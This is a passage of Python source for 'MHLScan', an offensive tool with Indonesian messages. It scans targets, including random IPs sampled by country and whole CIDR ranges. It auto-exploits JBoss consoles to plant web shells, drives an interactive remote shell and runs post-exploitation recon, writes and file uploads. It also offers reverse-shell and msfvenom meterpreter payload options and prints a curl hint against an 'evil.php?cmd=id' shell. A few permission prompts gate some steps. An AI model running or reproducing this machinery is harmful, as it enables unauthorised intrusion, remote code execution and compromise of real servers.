                _xss_forms = _crawler2._extract_forms(_html_xss, url) if _html_xss else []
                _xss_data = None
                _xss_check_url = None
                if _xss_forms:
                    _first = _xss_forms[0]
                    if _first.get("fields"):
                        _xss_data = {f: "test" for f in _first["fields"]}
                        _xss_check_url = _first.get("action") or url

                _xss_res = _xss.scan(
                    url, data=_xss_data,
                    timeout=min(timeout, 10),
                    check_dom=True,
                    check_stored=(GL_XSS_STORED and _xss_check_url is not None),
                    stored_check_url=_xss_check_url if GL_XSS_STORED else None,
                    use_oast=bool(GL_OAST_CLIENT),
                    oast_client=GL_OAST_CLIENT,
                )
                for _xf in _xss_res.get("findings", []):
                    _xf.setdefault("id", "XSS-" + _xf.get("context", "?") + "-" + _xf.get("method", "?"))
                    _xf.setdefault("name", "XSS (" + _xf.get("type", "reflected") + ")")
                    _xf["source"] = "xss"
                    _xf["url"] = _xf.get("url", url)
                    _xf["endpoint"] = _xf.get("param", url)
                    _enrich(_xf, url, "xss")
                    result["findings"].append(_xf)
                if _xss_res.get("findings"):
                    print(f"  {RED}[XSS] {len(_xss_res['findings'])} finding(s){ENDC}")
                    for _xf in _xss_res["findings"][:3]:
                        print(f"    - {_xf.get('type', 'reflected')} @ {_xf.get('param', '?')}")
            except Exception as _e:
                result["errors"].append(f"xss: {type(_e).__name__}: {_e}")

    # LAYER 5.5: CVE MODULES (plugins)
    try:
        import cve_modules
        _oast_url = getattr(GL_OAST_CLIENT, "url", None) if GL_OAST_CLIENT else None
        _cm_ctx = {"stack": fp["stack"],
                   "version": result.get("version", {}).get("version")}
        _cm_findings = cve_modules.run_all(
            url, timeout=min(timeout, 15),
            oast_url=_oast_url,
            context=_cm_ctx,
            enable_aggressive=GL_AGGRESSIVE,
        )
        for _f in _cm_findings:
            result["vulnerabilities"].append(_f)
            _c = SEVERITY_COLOR.get(_f["severity"], ENDC)
            _tag = "VERIFIED" if _f.get("verified") else "potential"
            print(f"  {_c}[{_f['severity']:>8}]{ENDC} [cve-plugin] {_f['id']} ({_tag})")
    except Exception as _e:
        result["errors"].append(f"cve_modules: {type(_e).__name__}: {_e}")

    # LAYER 6: SERVICE PAYLOADS
    if rec and rec.get("open_ports"):
        try:
            svc = _payloads.run_payloads(rec["host"], rec["open_ports"],
                                         rec["services"], timeout=min(timeout, 5))
            result["service_findings"] = svc
            for f in svc:
                if f.get("status") == "vulnerable":
                    v = {"id": "service:" + f["service"],
                         "name": f["service"] + ":" + str(f["port"]),
                         "type": "service",
                         "severity": f.get("severity", "high"),
                         "details": f.get("details", ""),
                         "port": f["port"],
                         "url": rec["host"] + ":" + str(f["port"]),
                         "endpoint": rec["host"] + ":" + str(f["port"]),
                         "evidence": f.get("details", ""), "source": "service"}
                    _build_poc(v, url)
                    result["vulnerabilities"].append(v)
                    sev = f.get("severity", "high")
                    c = SEVERITY_COLOR.get(sev, ENDC)
                    print(f"  {c}[{sev:>8}]{ENDC} {f['service']}:{f['port']} {f.get('details','')}")
                elif f.get("status") == "info":
                    print(f"  [info] {f['service']}:{f['port']} {f.get('details','')}")
        except Exception:
            pass

    # Network device CVE hints → findings
    if result.get("netdev") and result["netdev"].get("cves_hint"):
        for cve_id in result["netdev"]["cves_hint"]:
            v = {"id": cve_id,
                 "name": f"{result['netdev']['device_type'] or 'network device'} {cve_id}",
                 "type": "netdev-cve", "severity": "high",
                 "url": url, "endpoint": url,
                 "evidence": f"CVE hint untuk {result['netdev']['vendor']}",
                 "source": "netdev-hint"}
            _build_poc(v, url)
            result["vulnerabilities"].append(v)
            print(f"  {YELLOW}[high] {cve_id} — {result['netdev']['device_type']}{ENDC}")

    result["pipeline"]["cve"] = "completed"
    result["pipeline"]["payload"] = (
        "completed" if (result["vulnerabilities"] or result["service_findings"])
        else "no-target")
    return result


def auto_exploit_target(target_url, vuln, war_url=None):
    vector = vuln["id"]
    def _mk(res, v=vector):
        if not res: return None
        return {"shell_url": target_url.rstrip('/') + res["path"],
                "param": res["param"], "vector": v}
    if vector == "hdteam-console":
        return (_mk(_exploits.exploit_jmx_console_file_repository(target_url))
                or _mk(_exploits.exploit_jmx_console_main_deploy(target_url, war_url=war_url)))
    if vector == "web-console":
        return _mk(_exploits.exploit_web_console_invoker(target_url, war_url=war_url))
    if vector == "HdteamInvokerServlet":
        return _mk(_exploits.exploit_jmx_invoker_file_repository(target_url))
    if vuln["type"] == "cve" and vuln.get("shell_path"):
        return {"shell_url": target_url.rstrip('/') + vuln["shell_path"],
                "param": vuln.get("shell_param", "ppp"), "vector": vector}
    return None


# ============================================================
# REPORTS
# ============================================================
def write_html_report(results, html_path, ts):
    h = []
    a = h.append
    a('<!DOCTYPE html><html><head><meta charset="utf-8">')
    a(f'<title>MHLScan Report {ts}</title>')
    a('<style>')
    a('body{font-family:system-ui,sans-serif;margin:20px;background:#f5f5f5;color:#333}')
    a('h1{color:#222}h2{color:#444;border-bottom:2px solid #ddd;padding-bottom:5px;margin-top:30px}')
    a('h3{color:#555;margin-top:20px}')
    a('table{border-collapse:collapse;width:100%;background:#fff;margin:10px 0}')
    a('th{background:#333;color:#fff;padding:8px;text-align:left}')
    a('td{padding:6px 8px;border-bottom:1px solid #ddd;vertical-align:top}')
    a('tr:hover{background:#f0f0f0}')
    a('.sev-critical{color:#fff;background:#c00;padding:2px 6px;border-radius:3px;font-size:11px}')
    a('.sev-high{color:#fff;background:#e67e22;padding:2px 6px;border-radius:3px;font-size:11px}')
    a('.sev-medium{color:#fff;background:#f39c12;padding:2px 6px;border-radius:3px;font-size:11px}')
    a('.sev-low{color:#fff;background:#3498db;padding:2px 6px;border-radius:3px;font-size:11px}')
    a('.sev-info{color:#fff;background:#95a5a6;padding:2px 6px;border-radius:3px;font-size:11px}')
    a('.summary{background:#fff;padding:15px;border-radius:5px;margin:10px 0}')
    a('code{background:#eef;padding:1px 4px;border-radius:2px;font-family:monospace;font-size:12px}')
    a('.poc{background:#1e1e1e;color:#4ec9b0;padding:4px 8px;border-radius:3px;font-family:monospace;font-size:11px;display:block;margin:2px 0}')
    a('</style></head><body>')
    a(f'<h1>MHLScan Report - {ts}</h1>')
    total_f = sum(len(r.get("findings", [])) for r in results)
    total_v = sum(len(r.get("vulnerabilities", [])) for r in results)
    a(f'<div class=summary><strong>Targets:</strong> {len(results)} | '
      f'<strong>Findings:</strong> {total_f} | '
      f'<strong>Vulnerabilities:</strong> {total_v}</div>')
    def badge(sev):
        s = (sev or "info").lower()
        return f'<span class="sev-{s}">{sev}</span>'
    def poc_cell(f):
        poc = f.get("poc", "")
        if not poc: return "-"
        return f'<code class="poc">{poc.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")}</code>'

    for r in results:
        a(f'<h2>{r["target"]}</h2>')
        a('<table>')
        a(f'<tr><th style="width:150px">IP</th><td><code>{r.get("ip","-")}</code></td></tr>')
        stack_str = r.get("stack", "unknown")
        if r.get("stacks_all"): stack_str += " (" + ", ".join(r["stacks_all"]) + ")"
        a(f'<tr><th>Stack</th><td><strong>{stack_str}</strong></td></tr>')
        if r.get("server"): a(f'<tr><th>Server</th><td><code>{r["server"]}</code></td></tr>')
        if r.get("waf"): a(f'<tr><th>WAF/CDN</th><td><strong>{r["waf"]}</strong></td></tr>')
        if r.get("version") and r["version"].get("version"):
            v = r["version"]
            a(f'<tr><th>Version</th><td><strong>{v["version"]}</strong> ({v["confidence"]})</td></tr>')
        a('</table>')
        findings = r.get("findings", [])
        if findings:
            a('<h3>Findings</h3><table><tr><th>Severity</th><th>Name</th><th>PoC</th><th>Evidence</th></tr>')
            for x in findings:
                a(f'<tr><td>{badge(x["severity"])}</td><td>{x["name"]}</td>'
                  f'<td>{poc_cell(x)}</td><td>{x.get("evidence","-")}</td></tr>')
            a('</table>')
        vulns = r.get("vulnerabilities", [])
        if vulns:
            a('<h3>Vulnerabilities (RCE/Exploitable)</h3><table>'
              '<tr><th>Severity</th><th>ID</th><th>Name</th><th>PoC</th><th>Evidence</th></tr>')
            for v in vulns:
                a(f'<tr><td>{badge(v.get("severity"))}</td><td>{v["id"]}</td>'
                  f'<td>{v.get("name","-")}</td><td>{poc_cell(v)}</td>'
                  f'<td>{v.get("evidence") or v.get("details","-")}</td></tr>')
            a('</table>')
        if not findings and not vulns:
            a('<p>Tidak ada temuan.</p>')
    a('</body></html>')
    with open(html_path, 'w') as f:
        f.write('\n'.join(h))


def write_report(results, output_path=None):
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    base = output_path or _default_report_base()
    base = str(Path(base).with_suffix(''))
    json_path, md_path, html_path = f"{base}.json", f"{base}.md", f"{base}.html"

    with open(json_path, 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"{GREEN}[+] Report JSON: {json_path}{ENDC}")

    with open(md_path, 'w') as f:
        f.write(f"# MHLScan Report — {ts}\n\n")
        total_f = sum(len(r.get("findings", [])) for r in results)
        total_v = sum(len(r.get("vulnerabilities", [])) for r in results)
        f.write(f"- Total target: {len(results)}\n")
        f.write(f"- Total findings: {total_f}\n")
        f.write(f"- Total vulnerabilities: {total_v}\n\n")
        for r in results:
            f.write(f"## {r['target']}\n\n")
            f.write(f"- IP: `{r.get('ip', '-')}`\n")
            f.write(f"- Stack: **{r.get('stack', 'unknown')}**\n")
            if r.get("waf"): f.write(f"- WAF/CDN: **{r['waf']}**\n")
            f.write("\n")
            findings = r.get("findings", [])
            if findings:
                f.write("### Findings\n\n| Severity | Name | PoC Command | Evidence |\n")
                f.write("|----------|------|-------------|----------|\n")
                for x in findings:
                    f.write(f"| {x['severity']} | {x['name']} | `{x.get('poc', '-')}` | {x.get('evidence', '-')} |\n")
                f.write("\n")
            vulns = r.get("vulnerabilities", [])
            if vulns:
                f.write("### Vulnerabilities (RCE/Exploitable)\n\n")
                f.write("| Severity | ID | Name | PoC Command | Evidence |\n")
                f.write("|----------|-----|------|-------------|----------|\n")
                for v in vulns:
                    f.write(f"| {v.get('severity','?')} | {v['id']} | {v.get('name','-')} | "
                            f"`{v.get('poc', '-')}` | {v.get('evidence') or v.get('details', '-')} |\n")
                f.write("\n")
            if not findings and not vulns:
                f.write("- Tidak ada temuan.\n\n")
    print(f"{GREEN}[+] Report Markdown: {md_path}{ENDC}")
    write_html_report(results, html_path, ts)
    print(f"{GREEN}[+] Report HTML: {html_path}{ENDC}")


def consume_file(path, processed_targets):
    with open(path, 'r') as f:
        lines = f.readlines()
    remaining, removed = [], 0
    for line in lines:
        s = line.strip()
        if not s or s.startswith('#'):
            remaining.append(line); continue
        exp = parse_targets(s)
        if not exp:
            remaining.append(line); continue
        if all(t in processed_targets for t in exp):
            removed += 1; continue
        remaining.append(line)
    with open(path, 'w') as f:
        f.writelines(remaining)
    return removed


def interactive_shell(shell_url, param):
    print(f"{BOLD}{GREEN}║  MHLScan Auto-Shell : {shell_url[:40]:<40} ║{ENDC}")
    print(f"{BOLD}{GREEN}║  Ketik 'exit' untuk keluar.                                ║{ENDC}")
    session = requests.Session(); session.verify = False
    while True:
        try:
            cmd = input(f"{BOLD}{BLUE}shell > {ENDC}")
            if cmd.lower().strip() in ('exit', 'keluar', 'quit'): break
            if not cmd.strip(): continue
            sep = '&' if '?' in shell_url else '?'
            r = session.get(f"{shell_url}{sep}{param}={quote_plus(cmd)}", timeout=30)
            if r.status_code == 200:
                txt = r.text
                if '<pre>' in txt:
                    txt = txt.split('<pre>')[1].split('</pre>')[0]
                print(txt.strip())
            else:
                print(f"{RED}HTTP {r.status_code}{ENDC}")
        except KeyboardInterrupt:
            print("\nGunakan 'exit' untuk keluar.")
        except Exception as e:
            print(f"{RED}Error: {e}{ENDC}")


# ============================================================
# RUN SCAN (parallel)
# ============================================================
def run_scan(targets, timeout=5, proxy=None, proxy_list=None, stealth=True,
             war_url=None, report_path=None, consume=False, sodok_file=None,
             interactive_allowed=True, severity="medium",
             skip_generic=False, jboss_only=False, deep_services=False, workers=10):
    global GL_AUTO_EXPLOIT, GL_LHOST, GL_LPORT, GL_OAST_CLIENT, GL_POST_READ, GL_POST_WRITE
    if not targets:
        print(f"{RED}[!] Tidak ada target.{ENDC}"); return []

    batch_mode = len(targets) > 1
    if workers > 1:
        interactive_allowed = False

    print(f"{BLUE}[*] Target: {len(targets)}{ENDC}")
    print(f"{BLUE}[*] Mode: {'parallel' if workers > 1 else 'interaktif'}{ENDC}")
    print(f"{BLUE}[*] Workers: {workers} threads{ENDC}")
    print(f"{BLUE}[*] Stealth: {'aktif' if stealth else 'nonaktif'}{ENDC}")
    print(f"{BLUE}[*] Severity: {severity}{ENDC}\n")

    configure_http_pool(timeout, proxy, stealth, proxy_list)
    all_results = []

    def _scan_one(idx_target):
        idx, target = idx_target
        if gl_interrupted: return None
        try:
            return check_target(target, timeout, min_sev=severity,
                                skip_generic=skip_generic, jboss_only=jboss_only,
                                deep_services=deep_services, batch_mode=batch_mode,
                                interactive_allowed=interactive_allowed)
        except Exception as e:
            return {"target": target, "ip": None, "stack": "error",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "findings": [], "vulnerabilities": [],
                    "errors": [f"{type(e).__name__}: {e}"]}

    if workers <= 1:
        for i, t in enumerate(targets, 1):
            print(f"\n{BOLD}{CYAN}[{i}/{len(targets)}] {t}{ENDC}")
            res = _scan_one((i, t))
            if res: all_results.append(res)
    else:
        print(f"{CYAN}[*] Memulai scan paralel...{ENDC}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(_scan_one, (i, t)): t
                       for i, t in enumerate(targets, 1)}
            for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
                target = futures[future]
                res = future.result()
                if res:
                    all_results.append(res)
                    v_cnt = len(res.get("vulnerabilities", []))
                    f_cnt = len(res.get("findings", []))
                    status = f"{GREEN}✓{ENDC}" if (v_cnt+f_cnt) > 0 else "-"
                    print(f"  [{i}/{len(targets)}] {status} Selesai: {target} "
                          f"(RCE: {v_cnt}, Fnd: {f_cnt})")

    for res in all_results:
        if res.get("vulnerabilities"):
            ids = [v["id"] for v in res["vulnerabilities"]]
            print(f"{RED}[!] Rentan: {res['target']} -> {', '.join(ids)}{ENDC}")
            for vuln in res["vulnerabilities"]:
                exp = auto_exploit_target(res["target"], vuln, war_url=war_url)
                if exp:
                    res["exploited"] = exp
                    print(f"    {GREEN}[+] Sukses {vuln['id']} -> {exp['shell_url']}{ENDC}")

    # === SQL INJECTION SCAN (fase akhir, sebelum report) ===
    try:
        for _res in all_results:
            if not _res.get("findings") and not _res.get("vulnerabilities"):
                continue
            _rec = _res.get("recon") or {}
            _ports = _rec.get("open_ports") or []
            if not any(_p in (80, 443, 8080, 8443, 8000, 8888) for _p in _ports):
                continue
            if not getattr(args, "sqlmap", False):
                continue
            _sqlr = _sqlscan.scan_sqli(_res["target"], timeout=180)
            if _sqlr.get("vulnerable"):
                _res.setdefault("vulnerabilities", []).append({
                    "id": "SQLI",
                    "name": "SQL Injection",
                    "type": "sqli",
                    "severity": "critical",
                    "url": _res["target"],
                    "endpoint": _res["target"],
                    "evidence": f"method={_sqlr.get('method')}",
                    "source": "sqlscan",
                    "verified_rce": False,
                    "injectable_params": _sqlr.get("injectable_params", []),
                    "dbms": _sqlr.get("dbms"),
                })
                print(f"  {RED}[CRITICAL]{ENDC} SQLi di {_res['target']}")
    except Exception as _e:
        print(f"  {YELLOW}[!] sqlscan: {_e}{ENDC}")

    print(f"\n{BLUE}[*] Menulis laporan...{ENDC}")
    # Use modular reporter (JSON + MD + HTML + SARIF)
    if report_path:
        from pathlib import Path as _P
        base = str(_P(report_path).with_suffix(""))
    else:
        base = _default_report_base()
    try:
        # Tambah coverage WSTG + API Top 10 ke setiap target
        try:
            for _r in all_results:
                _all_f = (_r.get("findings", []) +
                          _r.get("vulnerabilities", []))
                _cov = _wstg.compute_coverage(_all_f)
                _r["wstg_coverage"] = _cov
                _r["api_coverage"] = _wstg.api_coverage(_all_f)
        except Exception as _e:
            print(f"  {YELLOW}[!] wstg coverage: {_e}{ENDC}")

        _paths = _reporter.write_all(all_results, base)
        for _fmt, _path in _paths.items():
            print(f"{GREEN}[+] Report {_fmt.upper()}: {_path}{ENDC}")
    except Exception as _e:
        print(f"{YELLOW}[!] Reporter error: {_e}, fallback ke built-in{ENDC}")
        write_report(all_results, report_path)

    # === AUTO-EXPLOIT (gate) ===
    if GL_AUTO_EXPLOIT:
        if not getattr(args, 'i_have_permission', False):
            print(f"  {RED}[!] --auto-exploit butuh --i-have-permission{ENDC}")
        else:
            try:
                _n_exploit = 0
                for _res in all_results:
                    for _v in _res.get("vulnerabilities", []):
                        _cid = _v.get("id", "")
                        if not _cid.startswith("CVE-"):
                            continue
                        _info = _exploits_db.get_cve(_cid)
                        if not _info or not _info.get("exploit"):
                            continue
                        print(f"  {CYAN}[exploit] {_cid} @ {_res['target']}{ENDC}")
                        _exp = _exploits_db.run_exploit(
                            _cid, _res["target"],
                            lhost=GL_LHOST, lport=GL_LPORT,
                            oast_client=GL_OAST_CLIENT,
                        )
                        _v["auto_exploit"] = _exp
                        if _exp.get("status") == "vulnerable":
                            _v["verified_rce"] = True
                            _v["shell_url"] = _exp.get("shell_url")
                            _n_exploit += 1
                            print(f"    {GREEN}[+] Exploited! {_exp.get('evidence', '')[:100]}{ENDC}")
                        elif _exp.get("status") == "manual":
                            print(f"    {YELLOW}[~] Manual: {_exp.get('note', '')[:80]}{ENDC}")
                if _n_exploit:
                    print(f"  {GREEN}[+] Auto-exploited {_n_exploit} CVE{ENDC}")
            except Exception as _e:
                print(f"  {YELLOW}[!] auto-exploit: {_e}{ENDC}")

    # === POST-EXPLOITATION ===
    if GL_POST_READ or GL_POST_WRITE:
        if GL_POST_WRITE and not getattr(args, 'i_have_permission', False):
            print(f"  {RED}[!] --post-write butuh --i-have-permission{ENDC}")
            GL_POST_WRITE = False

        if GL_POST_WRITE:
            print(f"\n{RED}{'='*60}{ENDC}")
            print(f"{RED}{BOLD}  POST-EXPLOIT WRITE GATE{ENDC}")
            print(f"{RED}{'='*60}{ENDC}")
            try:
                _confirm = input(f"{RED}Ketik 'I CONFIRM WRITE' untuk lanjut: {ENDC}").strip()
            except (EOFError, KeyboardInterrupt):
                _confirm = ""
            if _confirm != "I CONFIRM WRITE":
                print(f"  {YELLOW}[!] Write dibatalkan, fallback ke read-only{ENDC}")
                GL_POST_WRITE = False

        for _res in all_results:
            # Cari target dengan verified_rce
            _has_rce = any(v.get("verified_rce") or v.get("shell_url")
                          for v in _res.get("vulnerabilities", []))
            if not _has_rce:
                continue

            # Cari shell_url + param
            _shell_url = None
            _shell_param = "cmd"
            for _v in _res.get("vulnerabilities", []):
                if _v.get("shell_url"):
                    _shell_url = _v["shell_url"]
                    _shell_param = _v.get("shell_param") or _v.get("param") or "cmd"
                    break
                if _v.get("auto_exploit", {}).get("shell_url"):
                    _shell_url = _v["auto_exploit"]["shell_url"]
                    _shell_param = _v["auto_exploit"].get("shell_param", "cmd")
                    break

            if not _shell_url:
                # Fallback: coba target URL dengan param default
                _shell_url = _res["target"]
                _shell_param = "cmd"

            _os_type = "windows" if _res.get("stack") in ("aspnet", "iis") else "linux"

            print(f"\n{CYAN}[post] Target: {_res['target']} ({_os_type}){ENDC}")
            print(f"  [*] Shell: {_shell_url} param={_shell_param}")

            if GL_POST_READ:
                _recon = _post_exploit.recon_read(
                    _shell_url, _shell_param, os_type=_os_type, timeout=30)
                _res["post_recon"] = _recon
                print(f"  [+] Recon: {_recon['success_count']}/{_recon['total']} "
                      f"commands OK")
                for _f in _recon.get("findings", []):
                    print(f"    {YELLOW}[finding] {_f['type']}: {_f['evidence'][:80]}{ENDC}")

            if GL_POST_WRITE:
                _proof = _post_exploit.write_proof(
                    _shell_url, _shell_param, os_type=_os_type)
                _res["post_write_proof"] = _proof
                if _proof.get("success"):
                    print(f"  {GREEN}[+] Write proof OK{ENDC}")

                # Upload file kalau disediakan
                _upload_file = getattr(args, 'post_upload', None)
                if _upload_file:
                    from pathlib import Path as _P
                    _p = _P(_upload_file)
                    if _p.exists():
                        _remote_name = getattr(args, 'post_remote_name', 'uploaded.bin')
                        _up = _post_exploit.upload_file(
                            _shell_url, _shell_param,
                            _p.read_bytes(), remote_name=_remote_name,
                            os_type=_os_type)
                        _res["post_upload"] = _up
                        if _up.get("success"):
                            print(f"  {GREEN}[+] Uploaded {_up.get('size')} bytes "
                                  f"to {_up.get('remote_path')}{ENDC}")
                        else:
                            print(f"  {YELLOW}[!] Upload failed: {_up.get('error')}{ENDC}")

    if consume and sodok_file:
        processed = {r["target"] for r in all_results}
        removed = consume_file(sodok_file, processed)
        print(f"{GREEN}[+] Consume: {removed} baris dihapus{ENDC}")

    total_f = sum(len(r.get("findings", [])) for r in all_results)
    total_v = sum(len(r.get("vulnerabilities", [])) for r in all_results)

    # Hitung RCE dari nuclei findings juga (critical/high + nama RCE)
    rce_detected = total_v
    rce_verified = 0
    for r in all_results:
        for f in r.get("findings", []):
            name = (f.get("name") or "").upper()
            sev = (f.get("severity") or "").lower()
            if sev in ("critical", "high") and any(k in name for k in ("RCE", "COMMAND", "EXEC", "SHELL", "INJECT")):
                rce_detected += 1
                if f.get("verified_rce"):
                    rce_verified += 1
        for v in r.get("vulnerabilities", []):
            if v.get("verified_rce"):
                rce_verified += 1

    total_e = sum(1 for r in all_results if r.get("exploited"))

    print(f"\n{BOLD}{'='*55}{ENDC}")
    print(f"  Target: {len(all_results)}  Findings: {total_f}  "
          f"Vulnerabilities: {total_v}")
    print(f"  RCE detected (nuclei+service): {rce_detected}")
    print(f"  RCE verified (exploit works) : {rce_verified}")
    print(f"  Exploited (shell opened)     : {total_e}")
    print(f"{BOLD}{'='*55}{ENDC}")
    if rce_detected > 0 and rce_verified == 0:
        print(f"\n{YELLOW}  ℹ RCE terdeteksi tapi belum terverifikasi (verify_rce gagal):{ENDC}")
        print(f"     Kemungkinan: target memblokir perintah, WAF, atau target butuh payload spesifik.")
        print(f"     Cek manual: {CYAN}curl -sk 'https://target/...evil.php?cmd=id'{ENDC}")
    return all_results

def run_update(mode="default", stack=None):
    if mode == "all":
        print(f"{BOLD}{CYAN}{'='*60}{ENDC}")
        print(f"{BOLD}{CYAN} FULL UPDATE — Nuclei + CVE Intelligence Database{ENDC}")
        print(f"{BOLD}{CYAN}{'='*60}{ENDC}")
        print(f"{BLUE}[1/2] Nuclei templates (all stacks)...{ENDC}")
        _nuclei.update_all(min_severity="medium")
        try:
            import _stack_dynamic
            print(f"{BLUE}[1.5/2] Rebuild dynamic STACK_KEYWORDS...{ENDC}")
            _stack_dynamic.build_auto_stacks()
        except Exception as e:
            print(f"{YELLOW}[!] stack dynamic: {e}{ENDC}")
        print(f"{BLUE}[2/2] CVE Intelligence Database...{ENDC}")
        _cve_db.update_all()
        print(f"{GREEN}[+] Full update complete{ENDC}")
        return

    if mode == "nuclei":
        print(f"{BLUE}[*] Update Nuclei templates only...{ENDC}")
        _nuclei.update_all(min_severity="medium")
        try:
            import _stack_dynamic
            print(f"{BLUE}[*] Rebuild dynamic STACK_KEYWORDS...{ENDC}")
            _stack_dynamic.build_auto_stacks()
        except Exception as e:
            print(f"{YELLOW}[!] stack dynamic: {e}{ENDC}")
        return

    if mode == "cve-db":
        _cve_db.update_all()
        return

    if mode == "stack":
        if not stack:
            print(f"{RED}[!] butuh nama stack{ENDC}"); return
        _nuclei.update_stack(stack, min_severity="medium"); return

    # mode default (JBoss)
    cache = Path.home() / ".mhlscan" / "nuclei-templates"
    cache.mkdir(parents=True, exist_ok=True)
    base = "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves"
    for cve in ["CVE-2025-24813", "CVE-2022-29464"]:
        if cve not in _exploits.CVE_REGISTRY: continue
        year = cve.split("-")[1]
        try:
            r = requests.get(f"{base}/{year}/{cve}.yaml", timeout=15)
            if r.status_code == 200:
                (cache / f"{cve}.yaml").write_text(r.text)
                print(f"  {GREEN}[+] {cve}{ENDC}")
        except Exception: pass



def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{BOLD}{GREEN}MHLScan v{__version__} — Full Pipeline: CIDR + Subdomain + CVE + Payload + RCE{ENDC}\n")


def build_parser():
    p = argparse.ArgumentParser(
        prog='mhlscan.py',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"MHLScan v{__version__}")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--sodok", metavar="TARGET")
    g.add_argument("--sodok-file", metavar="FILE")
    g.add_argument("--update", action="store_true")
    g.add_argument("--update-all", action="store_true",
                   help="Update SEMUA: Nuclei templates + CVE database (KEV/EPSS/EDB/GitHub/vendors)")
    g.add_argument("--update-nuclei", action="store_true",
                   help="Update Nuclei templates only")
    g.add_argument("--update-cve-db", action="store_true",
                   help="Update CVE database only (KEV/EPSS/EDB/GitHub/vendors)")
    g.add_argument("--update-stack", metavar="NAME")
    g.add_argument("--ip-country", metavar="CC",
                   help="Scan sampel IP dari kode negara (ID, US, SG)")
    p.add_argument("--timeout", type=int, default=5)
    p.add_argument("--proxy")
    p.add_argument("--proxy-list")
    p.add_argument("--no-stealth", action="store_true")
    p.add_argument("--war-url")
    p.add_argument("--report", metavar="PATH")
    p.add_argument("--consume", action="store_true")
    p.add_argument("--no-interactive", action="store_true")
    p.add_argument("--severity", default="medium",
                   choices=["info", "low", "medium", "high", "critical"])
    p.add_argument("--skip-generic", action="store_true")
    p.add_argument("--jboss-only", action="store_true")
    p.add_argument("--run-nuclei", action="store_true")
    p.add_argument("--plugins", action="store_true")
    p.add_argument("--deep-services", action="store_true")
    p.add_argument("--workers", type=int, default=10)
    p.add_argument("--geo-limit", type=int, default=50)
    p.add_argument("--list-cves", action="store_true",
                   help="List CVE modules (plugin) yang terdaftar")
    p.add_argument("--disable-cve", action="append", metavar="CVE_ID",
                   help="Disable CVE module (bisa multiple)")
    p.add_argument("--rev-shell", action="store_true")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--no-subdomain", action="store_true")
    p.add_argument("--subdomain-only", action="store_true")
    p.add_argument("--subdomain-limit", type=int, default=50)
    p.add_argument("--subdomain-aggressive", action="store_true")
    p.add_argument("--no-port-expand", action="store_true")
    p.add_argument("--cidr-max", type=int, default=256)
    p.add_argument("--cidr-threads", type=int, default=100)
    p.add_argument("--cidr-all", action="store_true")
    p.add_argument("--crawl", action="store_true",
                   help="Enable BFS crawl")
    p.add_argument("--crawl-max-pages", type=int, default=50,
                   help="Max pages (default: 50)")
    p.add_argument("--crawl-max-depth", type=int, default=3,
                   help="Max depth (default: 3)")
    p.add_argument("--oast", action="store_true",
                   help="Enable OAST verification")
    p.add_argument("--oast-server", default="oast.live",
                   help="Interactsh server")
    p.add_argument("--auth-config", metavar="FILE",
                   help="JSON auth config")
    p.add_argument("--skip-http-methods", action="store_true",
                   help="Skip HTTP method scanner")
    p.add_argument("--http-put", action="store_true",
                   help="Enable PUT upload test (writes marker)")
    p.add_argument("--aggressive", action="store_true",
                   help="Enable aggressive CVE modules (race, UAF, dll)")
    p.add_argument("--sqlmap", action="store_true", default=False,
                   help="Enable SQLi scanner (default: OFF, aktifkan via menu Settings atau flag ini)")
    p.add_argument("--no-amass", action="store_true",
                   help="Disable amass subdomain enumeration")
    p.add_argument("--coverage", action="store_true", default=True,
                   help="Enable WSTG coverage report (default: ON)")
    p.add_argument("--discovery", choices=["arp", "icmp", "tcp", "udp", "all"],
                   default="all",
                   help="Discovery method for CIDR (default: all)")
    p.add_argument("--neighbor-board", action="store_true",
                   help="Tampilkan peta neighbor setelah discovery")

    # --- Param discovery / JWT / Smuggling ---
    p.add_argument("--param-discovery", action="store_true",
                   help="Discover hidden parameters (Arjun-class)")
    p.add_argument("--jwt-analysis", action="store_true",
                   help="Analyze JWT tokens found in response")
    p.add_argument("--smuggle", action="store_true",
                   help="Probe HTTP request smuggling")

    # --- XSS Scanner ---
    p.add_argument("--xss", action="store_true",
                   help="Enable XSS scanner (reflected/DOM/stored)")

    # --- Exploit DB ---
    p.add_argument("--auto-exploit", action="store_true",
                   help="Auto-exploit verified CVE (butuh --i-have-permission)")
    p.add_argument("--exploit-cve", metavar="CVE_ID",
                   help="Run specific CVE from _exploits_db")
    p.add_argument("--list-exploits", action="store_true",
                   help="List all CVEs in _exploits_db")

    # --- Payload Generator ---
    p.add_argument("--gen-payload", metavar="NAME",
                   help="Generate payload (lihat --list-payloads)")
    p.add_argument("--list-payloads", action="store_true",
                   help="List available payloads")
    p.add_argument("--list-encoders", action="store_true",
                   help="List available encoders")
    p.add_argument("--encode", metavar="ENC",
                   help="Encoder untuk payload")
    p.add_argument("--format", default="raw",
                   choices=["raw", "c_array", "python_bytes",
                            "python_bytearray", "powershell", "hex_string"],
                   help="Output format")
    p.add_argument("--msfvenom", metavar="PAYLOAD",
                   help="Generate via msfvenom (e.g. windows/x64/meterpreter/reverse_tcp)")
    p.add_argument("--msf-format", default="raw",
                   help="msfvenom output format")

    # --- Post-Exploitation ---
    p.add_argument("--post-read", action="store_true",
                   help="Post-exploit read-only recon")
    p.add_argument("--post-write", action="store_true",
                   help="Enable write operations (GATE: --i-have-permission)")
    p.add_argument("--post-cmd", metavar="CMD",
                   help="Run specific command in post-exploit")
    p.add_argument("--post-upload", metavar="LOCAL_FILE",
                   help="Upload local file to target")
    p.add_argument("--post-remote-name", default="uploaded.bin",
                   help="Remote filename for upload")
    p.add_argument("--xss-stored", action="store_true",
                   help="Enable stored XSS test (butuh --crawl)")

    # --- Crawler ---
    p.add_argument("--crawl-mode", choices=["bfs", "dfs"],
                   default="bfs", help="Crawl mode (default: bfs)")
    p.add_argument("--crawl-rate", type=float, default=1.0,
                   help="Crawl rate limit req/s (default: 1.0)")

